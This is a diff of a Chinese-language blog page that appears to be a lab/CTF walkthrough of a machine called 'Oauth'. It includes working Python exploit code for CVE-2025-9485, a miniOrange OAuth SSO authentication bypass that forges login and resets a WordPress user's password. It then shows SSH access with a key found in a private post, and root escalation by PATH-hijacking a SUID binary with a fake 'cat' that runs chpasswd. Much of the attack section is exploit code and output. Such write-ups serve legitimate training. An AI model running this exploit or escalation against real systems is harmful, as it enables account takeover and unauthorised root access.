-        <span class="pl-en">print</span>(<span class="pl-s">f"    <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">B</span><span class="pl-kos">}</span></span>Password:<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">E</span><span class="pl-kos">}</span></span> <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">R</span><span class="pl-kos">}</span></span><span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">pw</span><span class="pl-kos">}</span></span><span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">E</span><span class="pl-kos">}</span></span>"</span>)
-    <span class="pl-k">else</span>:
-        <span class="pl-en">print</span>(<span class="pl-s">f"<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">R</span><span class="pl-kos">}</span></span>[-]<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">E</span><span class="pl-kos">}</span></span> Password change failed"</span>)
+def change_pw(s, scheme, ip, port, username, pw):
+    r = s.get(mkurl(scheme, ip, port, &quot;/wp-admin/profile.php&quot;), timeout=10)
+    if r.status_code != 200:
+        return False
+    fields = {}
+    for m in re.finditer(r'&lt;input[^&gt;]*name=[&quot;\']([^&quot;\']+)[&quot;\'][^&gt;]*value=[&quot;\']([^&quot;\']*)[&quot;\']', r.text, re.I):
+        fields[m.group(1)] = html.unescape(m.group(2))
+    for m in re.finditer(r'&lt;input[^&gt;]*value=[&quot;\']([^&quot;\']*)[&quot;\'][^&gt;]*name=[&quot;\']([^&quot;\']+)[&quot;\']', r.text, re.I):
+        fields[m.group(2)] = html.unescape(m.group(1))
+    fields.update({&quot;action&quot;: &quot;update&quot;, &quot;pass1&quot;: pw, &quot;pass2&quot;: pw, &quot;pw_weak&quot;: &quot;on&quot;, &quot;submit&quot;: &quot;Update Profile&quot;})
+    if not fields.get(&quot;display_name&quot;):
+        fields[&quot;display_name&quot;] = username
+    r = s.post(mkurl(scheme, ip, port, &quot;/wp-admin/profile.php&quot;), data=fields, allow_redirects=False, timeout=10)
+    return &quot;updated=1&quot; in r.headers.get(&quot;Location&quot;, &quot;&quot;) or &quot;updated=true&quot; in r.headers.get(&quot;Location&quot;, &quot;&quot;)
 
 
-<span class="pl-k">if</span> <span class="pl-s1">__name__</span> <span class="pl-c1">==</span> <span class="pl-s">"__main__"</span>:
-    <span class="pl-en">main</span>()</pre></div>
+def main():
+    parser = argparse.ArgumentParser(description=&quot;CVE-2025-9485 | miniOrange OAuth Single Sign On &lt; 6.26.13 Authentication Bypass&quot;)
+    parser.add_argument(&quot;url&quot;, help=&quot;http://target or target IP&quot;)
+    args = parser.parse_args()
+
+    scheme, ip, port = parse_url(args.url)
+    host = get_wp_host(scheme, ip, port)
+    s = requests.Session()
+    s.headers.update({&quot;Host&quot;: host})
+
+    print(f&quot;{C}[*]{E} Target: {B}{scheme}://{ip}:{port}{E} (Host: {host})&quot;)
+    version, app = check_vuln(s, scheme, ip, port)
+    if app is None:
+        print(f&quot;{R}[-]{E} Not vulnerable. Plugin version: {version or 'not found'}&quot;)
+        return
+    print(f&quot;{G}[+]{E} Plugin version: {Y}{version or 'unknown'}{E} | app_name: {Y}{app}{E}&quot;)
+    print(f&quot;{G}[+]{E} {R}{B}Vulnerable to CVE-2025-9485{E}&quot;)
+
+    users = get_users(s, scheme, ip, port)
+    if not users:
+        print(f&quot;{R}[-]{E} No public users found&quot;)
+        u = input(f&quot;{Y}[?]{E} Enter username: &quot;).strip()
+        if not u:
+            return
+        users = [u]
+    else:
+        print(f&quot;{C}[*]{E} Users: {', '.join(users)}&quot;)
+        for i, u in enumerate(users):
+            print(f&quot;  {C}[{i}]{E} {u}&quot;)
+        c = input(f&quot;{Y}[?]{E} Select user [0-{len(users)-1}]: &quot;).strip()
+        if not c.isdigit() or int(c) &gt;= len(users):
+            return
+        users = [users[int(c)]]
+
+    username = users[0]
+    email = f&quot;{username}@{host.split(':')[0]}&quot;
+    print(f&quot;{C}[*]{E} Exploiting: {B}{username}{E} ({email})&quot;)
+
+    if not exploit(s, scheme, ip, port, app, username, email):
+        print(f&quot;{R}[-]{E} Failed, no login cookie&quot;)
+        return
+    print(f&quot;{G}[+]{E} {G}Auth bypass success!{E}&quot;)
+
+    pw = rand_pw()
+    if change_pw(s, scheme, ip, port, username, pw):
+        print(f&quot;{G}[+]{E} {G}Password changed!{E}&quot;)
+        print(f&quot;    {B}URL:{E}      {scheme}://{host}/wp-login.php&quot;)
+        print(f&quot;    {B}Username:{E} {username}&quot;)
+        print(f&quot;    {B}Password:{E} {R}{pw}{E}&quot;)
+    else:
+        print(f&quot;{R}[-]{E} Password change failed&quot;)
+
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
 <p>跑一下。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">python3 exp.py http://<span class="pl-smi">$IP</span></pre></div>
-<pre class="notranslate"><code class="notranslate">[*] Target: http://192.168.205.208:80 (Host: oauth.dsz)
+<pre lang="bash"><code>python3 exp.py http://$IP
+</code></pre>
+<pre><code>[*] Target: http://192.168.205.208:80 (Host: oauth.dsz)
 [+] Plugin version: 6.26.11 | app_name: keycloak
 [+] Vulnerable to CVE-2025-9485
 [*] Users: yepian
@@ -364,49 +364,56 @@ id_token=&lt;伪造JWT&gt;&amp;state=&lt;步骤1的state&gt;
     Username: yepian
     Password: aK7#mR2xLp9&amp;wQ4vBnYs
 </code></pre>
-<p>脚本自动完成了漏洞检测、<code class="notranslate">state/nonce</code> 获取、JWT 伪造、回调提交、密码修改全流程。用输出的凭证登录 WordPress 后台。</p>
+<p>脚本自动完成了漏洞检测、<code>state/nonce</code> 获取、JWT 伪造、回调提交、密码修改全流程。用输出的凭证登录 WordPress 后台。</p>
 <h1>WordPress 后台获取 SSH 密钥</h1>
-<p>进到后台翻文章列表，发现一篇标题为 "My Secret" 的私密文章，内容是完整的 OpenSSH 私钥。保存下来连 SSH。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">vim id_rsa
+<p>进到后台翻文章列表，发现一篇标题为 &quot;My Secret&quot; 的私密文章，内容是完整的 OpenSSH 私钥。保存下来连 SSH。</p>
+<pre lang="bash"><code>vim id_rsa
 chmod 600 id_rsa
-ssh -i id_rsa yepian@<span class="pl-smi">$IP</span></pre></div>
-<pre class="notranslate"><code class="notranslate">yepian@Oauth:~$ id
+ssh -i id_rsa yepian@$IP
+</code></pre>
+<pre><code>yepian@Oauth:~$ id
 uid=102(yepian) gid=103(yepian) groups=103(yepian)
 </code></pre>
 <p>拿到 yepian 的 shell。</p>
 <h1>本地提权</h1>
 <h2>SUID 二进制分析</h2>
-<div class="highlight highlight-source-shell"><pre class="notranslate">find / -perm -4000 <span class="pl-k">2&gt;</span>/dev/null</pre></div>
-<pre class="notranslate"><code class="notranslate">/opt/scripts/CheckSystem
+<pre lang="bash"><code>find / -perm -4000 2&gt;/dev/null
 </code></pre>
-<p><code class="notranslate">/opt/scripts/</code> 下有个 SUID root 的二进制 <code class="notranslate">CheckSystem</code>，旁边 plugins 目录下两个 <code class="notranslate">.sh</code> 脚本当前用户没有读权限。用 strings 看一下。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">strings /opt/scripts/CheckSystem <span class="pl-k">|</span> grep <span class="pl-s"><span class="pl-pds">"</span>for <span class="pl-pds">"</span></span></pre></div>
-<pre class="notranslate"><code class="notranslate">for f in /opt/scripts/plugins/*.sh; do /bin/bash "$f"; done;
+<pre><code>/opt/scripts/CheckSystem
+</code></pre>
+<p><code>/opt/scripts/</code> 下有个 SUID root 的二进制 <code>CheckSystem</code>，旁边 plugins 目录下两个 <code>.sh</code> 脚本当前用户没有读权限。用 strings 看一下。</p>
+<pre lang="bash"><code>strings /opt/scripts/CheckSystem | grep &quot;for &quot;
+</code></pre>
+<pre><code>for f in /opt/scripts/plugins/*.sh; do /bin/bash &quot;$f&quot;; done;
 </code></pre>
 <p>把它拖回来反编译确认 main 函数逻辑。</p>
-<div class="highlight highlight-source-c"><pre class="notranslate"><span class="pl-smi">int</span> <span class="pl-en">main</span>() {
-  <span class="pl-en">setuid</span>(<span class="pl-c1">0</span>);
-  <span class="pl-en">setgid</span>(<span class="pl-c1">0</span>);
-  <span class="pl-en">system</span>(<span class="pl-s">"for f in /opt/scripts/plugins/*.sh; do /bin/bash \"$f\"; done;"</span>);
-  <span class="pl-k">return</span> <span class="pl-c1">0</span>;
-}</pre></div>
-<p><code class="notranslate">setuid(0)</code> 提到 root 后直接 <code class="notranslate">system()</code> 执行 shell 命令，而 <code class="notranslate">system()</code> 会继承调用者的 PATH 环境变量。虽然 plugins 目录写不进去，但只要脚本内部调用的命令没用绝对路径就能劫持。</p>
+<pre lang="c"><code>int main() {
+  setuid(0);
+  setgid(0);
+  system(&quot;for f in /opt/scripts/plugins/*.sh; do /bin/bash \&quot;$f\&quot;; done;&quot;);
+  return 0;
+}
+</code></pre>
+<p><code>setuid(0)</code> 提到 root 后直接 <code>system()</code> 执行 shell 命令，而 <code>system()</code> 会继承调用者的 PATH 环境变量。虽然 plugins 目录写不进去，但只要脚本内部调用的命令没用绝对路径就能劫持。</p>
 <h2>进程监控确认劫持目标</h2>
 <p>执行 CheckSystem 的同时用进程监控抓以 UID=0 运行的子命令。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">/opt/scripts/CheckSystem</pre></div>
-<pre class="notranslate"><code class="notranslate">CMD: UID=0  PID=26704  | cat /var/mail/yepian/message.md
+<pre lang="bash"><code>/opt/scripts/CheckSystem
+</code></pre>
+<pre><code>CMD: UID=0  PID=26704  | cat /var/mail/yepian/message.md
 CMD: UID=0  PID=26706  | ps -ef
 CMD: UID=0  PID=26708  | grep -v grep
 </code></pre>
-<p>CheckMail.sh 调了 <code class="notranslate">cat</code>，CheckServices.sh 调了 <code class="notranslate">ps</code> 和 <code class="notranslate">grep</code>，全部没写绝对路径。</p>
+<p>CheckMail.sh 调了 <code>cat</code>，CheckServices.sh 调了 <code>ps</code> 和 <code>grep</code>，全部没写绝对路径。</p>
 <h2>PATH 劫持提权</h2>
-<p>在 home 目录下创建恶意 <code class="notranslate">cat</code>，保存为 <code class="notranslate">~/cat</code>：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#!</span>/bin/bash</span>
-<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>root:root123<span class="pl-pds">"</span></span> <span class="pl-k">|</span> chpasswd<span class="pl-k">;</span>
-<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>123456<span class="pl-pds">"</span></span></pre></div>
-<div class="highlight highlight-source-shell"><pre class="notranslate">chmod +x <span class="pl-k">~</span>/cat
-PATH=<span class="pl-k">~</span>:<span class="pl-smi">$PATH</span> /opt/scripts/CheckSystem</pre></div>
-<pre class="notranslate"><code class="notranslate">Fetching Message...
+<p>在 home 目录下创建恶意 <code>cat</code>，保存为 <code>~/cat</code>：</p>
+<pre lang="bash"><code>#!/bin/bash
+echo &quot;root:root123&quot; | chpasswd;
+echo &quot;123456&quot;
+</code></pre>
+<pre lang="bash"><code>chmod +x ~/cat
+PATH=~:$PATH /opt/scripts/CheckSystem
+</code></pre>
+<pre><code>Fetching Message...
 ================================================
 = From:cxzlw   To:yepian =
 123456
@@ -415,15 +422,18 @@ Checking Services...
 KeyCloak Alive!
 WordPress Alive!
 </code></pre>
-<p><code class="notranslate">cat</code> 被劫持，root 密码已改为 <code class="notranslate">root123</code>。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">yepian@Oauth:<span class="pl-k">~</span>$ su -
+<p><code>cat</code> 被劫持，root 密码已改为 <code>root123</code>。</p>
+<pre lang="bash"><code>yepian@Oauth:~$ su -
 Password: root123
-root@Oauth:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> id</span>
-uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</pre></div>
+root@Oauth:~# id
+uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+</code></pre>
 <h1>Flag</h1>
-<div class="highlight highlight-source-shell"><pre class="notranslate">root@Oauth:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> cat /home/yepian/user.txt /root/root.txt</span>
+<pre lang="bash"><code>root@Oauth:~# cat /home/yepian/user.txt /root/root.txt
 flag{user-UserFlag}
-flag{root-RootFlag}</pre></div></div>
+flag{root-RootFlag}
+</code></pre>
+</div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
@@ -448,7 +458,7 @@ if(""!=""){
 </script></div>
 </body>
 <script>
-var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
 var utterancesLoad=0;
 
 console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
@@ -495,70 +505,7 @@ function iFrameLoading(){
     }
 }
 
-document.addEventListener('DOMContentLoaded', () => {
-    const createClipboardHTML = (codeContent, additionalClasses = '') => `
-        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
-        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
-            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
-                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
-                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
-            </clipboard-copy>
-            <div class="copy-feedback">Copied!</div>
-        </div>
-    `;
 
-    const handleCodeElements = (selector = '') => {
-        document.querySelectorAll(selector).forEach(codeElement => {
-            const codeContent = codeElement.innerHTML;
-            const newStructure = document.createElement('div');
-            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
-            newStructure.innerHTML = createClipboardHTML(codeContent);
-
-            const parentElement = codeElement.parentElement;
-            if (selector.includes('highlight')) {
-                parentElement.insertBefore(newStructure, codeElement.nextSibling);
-                parentElement.removeChild(codeElement);
-            } else {
-                parentElement.parentElement.replaceChild(newStructure, parentElement);
-            }
-        });
-    };
-
-    handleCodeElements('pre.notranslate > code.notranslate');
-    handleCodeElements('div.highlight > pre.notranslate');
-
-    let currentFeedback = null;
-    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
-        copyButton.addEventListener('click', () => {
-            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
-            const tempTextArea = document.createElement('textarea');
-            tempTextArea.value = codeContent;
-            document.body.appendChild(tempTextArea);
-            tempTextArea.select();
-            document.execCommand('copy');
-            document.body.removeChild(tempTextArea);
-
-            const copyIcon = copyButton.querySelector('.octicon-copy');
-            const checkIcon = copyButton.querySelector('.octicon-check');
-            const copyFeedback = copyButton.nextElementSibling;
-
-            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
-            currentFeedback = copyFeedback;
-
-            copyIcon.classList.add('d-none');
-            checkIcon.classList.remove('d-none');
-            copyFeedback.style.display = 'block';
-            copyButton.style.borderColor = 'var(--color-success-fg)';
-
-            setTimeout(() => {
-                copyIcon.classList.remove('d-none');
-                checkIcon.classList.add('d-none');
-                copyFeedback.style.display = 'none';
-                copyButton.style.borderColor = '';
-            }, 2000);
-        });
-    });
-});
 
 </script>
 </script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
